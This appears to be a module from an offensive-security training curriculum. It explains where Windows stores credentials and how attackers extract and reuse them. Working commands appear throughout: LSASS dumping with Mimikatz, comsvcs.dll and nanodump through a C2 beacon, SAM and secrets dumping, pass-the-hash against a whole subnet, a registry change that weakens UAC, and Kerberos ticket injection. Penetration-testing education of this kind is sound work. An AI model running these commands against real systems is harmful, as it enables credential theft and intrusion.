# Phase 08: Credential Access — How Windows Stores Secrets

> **Why this phase exists**: "Run Mimikatz" is not a technique. Understanding where Windows puts credentials, why they're accessible, and how each extraction method works lets you choose the right tool for the situation — and fix it when it doesn't work.

**Study time**: 1 week
**Difficulty**: Intermediate

---

## Learning Objectives

- [ ] Explain why LSASS holds credentials and what's inside it
- [ ] Explain the difference between an NTLM hash and a NetNTLMv2 hash — and why it matters
- [ ] Explain what Pass-the-Hash is, why it works, and what its limitations are
- [ ] Explain what Process Protection Light (PPL) is and two ways to bypass it
- [ ] Dump credentials from LSASS in at least 3 different ways
- [ ] Extract credentials from SAM, SECURITY hive, and credential manager

---

## 1. Where Windows Puts Credentials

Windows stores credentials in several places, each accessible under different conditions:

### LSASS process memory

**What**: Every user who has authenticated to this machine since last boot has residue in LSASS memory:
- Their NTLM hash (always present)
- Their Kerberos TGT (if they used Kerberos)
- AES encryption keys
- Sometimes cleartext password (if WDigest is enabled — disabled by default since 8.1)

**Why LSASS has them**: Authentication requires comparing credentials. LSASS keeps session keys in memory so subsequent authentication to resources doesn't require re-entering passwords (SSO).

**Access requirement**: SeDebugPrivilege (= SYSTEM or a process with explicit debug rights)

### SAM database (`C:\Windows\System32\config\SAM`)

**What**: Local account NTLM hashes. Only local accounts (not domain accounts).

**Why it's protected**: SAM is encrypted with the SYSKEY, which is stored in the SYSTEM hive. You need both SAM and SYSTEM to decrypt.

**Access requirement**: SYSTEM (SAM is locked while Windows is running — can be read via VSS or registry save)

### SECURITY hive (`C:\Windows\System32\config\SECURITY`)

**What**: LSA secrets — service account credentials that services use to authenticate, cached domain credentials (domain password hashes for offline login), domain controller's computer account password.

**Access requirement**: SYSTEM

### DPAPI (Data Protection API)

**What**: Browser saved passwords, Windows Credential Manager entries, certificates with private keys. All encrypted by DPAPI using the user's password as the key.

**Access requirement**: Running as the user whose DPAPI data you want, OR having their password/NTLM hash, OR having the domain backup key (requires DA)

---

## 2. NTLM Hash vs NetNTLMv2 — A Critical Distinction

This trips up many beginners. They are completely different things.

### NTLM hash (also called NT hash)

```
Password: "Password1"
NTLM hash: 64f12cddaa88057e06a81b54e73b949b
```

This is a hash **stored in SAM / LSASS / NTDS**. It's the actual stored credential.

**You can Pass-the-Hash with it.** NTLM authentication lets you authenticate with just the hash — you never need the plaintext password.

### NetNTLMv2 (also called NTLMv2 challenge-response)

```
NTLMSSP_AUTH message:
  NTProofStr: a8b23c4d... (response to challenge)
  NTChallengeResponse: (longer response blob)
```

This is a **challenge-response** captured over the network during authentication (e.g., via Responder). It is **not** the stored hash.

**You cannot Pass-the-Hash with it.** You must crack it to get the plaintext password, then use the password.

**Why this matters for the exam**: When you dump LSASS, you get NTLM hashes — usable directly. When you capture with Responder, you get NetNTLMv2 — crack first, then use.

---

## 3. Dumping LSASS — Multiple Methods

### Method 1: Mimikatz (via C2 execute-assembly)

```bash
sliver (beacon) > execute-assembly ~/tools/Mimikatz.exe \
  "privilege::debug" "sekurlsa::logonpasswords" "exit"

# Output includes:
# Username : jdoe
# Domain   : LAB
# NTLM     : 64f12cddaa88057e06a81b54e73b949b
# ← this is your PtH credential
```

**Why `privilege::debug` first**: Mimikatz needs SeDebugPrivilege to open LSASS. This command enables it if you're running as admin/SYSTEM.

### Method 2: comsvcs.dll MiniDump (LOLBin — no custom binary)

```powershell
# Get LSASS PID
Get-Process lsass | Select-Object Id

# Dump (uses Microsoft-signed DLL)
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <LSASS_PID> C:\Windows\Temp\lsass.dmp full

# Download dump via C2
sliver (beacon) > download C:\\Windows\\Temp\\lsass.dmp ~/exam/loot/

# Parse offline on Kali (no need for Windows)
pypykatz lsa minidump ~/exam/loot/lsass.dmp
```

**Why this is useful**: No custom binary on the target. `rundll32.exe` and `comsvcs.dll` are both Microsoft-signed. The dump file itself may get flagged, but the process is legitimate.

### Method 3: nanodump (stealthiest option)

```bash
sliver (beacon) > execute-assembly ~/tools/nanodump.exe --write C:\\Windows\\Temp\\dump.dmp

# Parse the same way
pypykatz lsa minidump dump.dmp
```

**Why nanodump is stealthier**: It doesn't use `MiniDumpWriteDump` (the standard API that EDRs hook). Instead it directly reads LSASS memory by creating a "fork" of the LSASS process using an undocumented handle duplication technique. The resulting dump looks different from standard minidumps, bypassing some signature-based detections.

### Method 4: Task Manager (manual, no tools needed)

```
1. Open Task Manager on the Windows GUI
2. Details tab → right-click lsass.exe → Create dump file
3. Dump created in C:\Users\<user>\AppData\Local\Temp\lsass.DMP
```

Often works even when everything else fails — Task Manager is trusted by Windows.

---

## 4. SAM Extraction

```bash
# Method A: registry save (needs admin)
reg save HKLM\SAM C:\Windows\Temp\sam.save
reg save HKLM\SYSTEM C:\Windows\Temp\sys.save
reg save HKLM\SECURITY C:\Windows\Temp\sec.save

# Transfer to Kali and parse
secretsdump.py -sam sam.save -system sys.save -security sec.save LOCAL

# Method B: remote (from Kali, if you have admin creds)
secretsdump.py domain/administrator:Password1@<target_ip>
# This uses the DRSUAPI or SMB protocol to extract remotely
```

**What you get from SAM**: Local account hashes. In the exam context, this gives you the local Administrator hash — useful for PtH to other machines that share the same local admin password.

---

## 5. Pass-the-Hash (PtH) — Why It Works

### The mechanism

NTLM authentication was designed in the 1990s before modern security practices. The protocol allows a client to authenticate using just their password hash (the hash *is* the credential). The hash is used to sign a challenge — the server verifies the signature.

**Consequence**: If you have the NTLM hash, you can authenticate as that user to any NTLM-supporting service without ever knowing the plaintext password.

```bash
# PtH with various tools — the hash replaces the password
evil-winrm -i <target> -u administrator -H 64f12cddaa88057e06a81b54e73b949b
psexec.py -hashes :64f12cddaa88057e06a81b54e73b949b administrator@<target>
nxc smb <subnet>/24 -u administrator -H 64f12cddaa88057e06a81b54e73b949b --local-auth
```

**Important format note**: Impacket tools use `LMhash:NTLMhash`. The LM hash is almost always empty on modern Windows. Use `:NTLMhash` (empty LM, colon, then NT hash).

### When PtH doesn't work

- **Kerberos-only environments**: If NTLM is disabled, PtH doesn't work. Use Pass-the-Ticket instead.
- **Local accounts with UAC Remote Restrictions**: By default, the built-in local Administrator (RID 500) can PtH, but other local admin accounts are blocked by UAC remote restrictions (a 2012 security change). Fix: `reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f`
- **Protected Users group**: Domain accounts in this group can't use NTLM at all.

---

## 6. Kerberos Tickets — Pass-the-Ticket

When you dump LSASS, you don't just get NTLM hashes — you get Kerberos tickets too. TGTs (Ticket Granting Tickets) let you request service tickets without a password or hash.

```powershell
# Dump tickets from LSASS (Windows)
.\Rubeus.exe dump /nowrap
# → base64-encoded TGTs and service tickets

# Inject a ticket into your session
.\Rubeus.exe ptt /ticket:<base64_ticket>
klist  # verify ticket is in memory

# From Linux: use ccache format
getTGT.py domain.local/user:password -dc-ip <dc_ip>
export KRB5CCNAME=user.ccache
# Now any Kerberos-aware tool uses this ticket automatically
```

**Why PtT is stealthier than PtH**: Kerberos authentication generates expected events. PtH generates NTLM events — in a domain that uses Kerberos by default, NTLM auth from an unexpected source is suspicious.

---

## Practice Labs

| Lab | Platform | Focus |
|-----|---------|-------|
| [THM: Post-Exploitation Basics](https://tryhackme.com/room/postexploit) | THM (Sub) | Mimikatz, credential dumping |
| [THM: Holo](https://tryhackme.com/room/hololive) | THM (Sub) | Full chain including cred access |
| [HTB: Monteverde](https://app.hackthebox.com/machines/Monteverde) | HTB (Free) | Azure AD creds in config files |
| Manual: Cred dump lab | Your lab | Dump LSASS 4 ways, parse each, PtH to another host |

---

## Phase 08 Mastery Checklist

- [ ] Can you explain the difference between an NTLM hash and NetNTLMv2 and what you can do with each?
- [ ] Can you dump LSASS using comsvcs.dll (no custom binary) and parse it with pypykatz?
- [ ] Can you dump SAM remotely using secretsdump.py?
- [ ] Can you use an NTLM hash to get a shell via evil-winrm without knowing the password?
- [ ] Can you explain why PtH works — the actual protocol mechanism?
- [ ] Can you explain what PPL is and name 2 bypass methods?
- [ ] Can you extract Kerberos tickets from LSASS and inject them on Linux?

---

## Next Phase → **Phase 09: Lateral Movement & Pivoting**
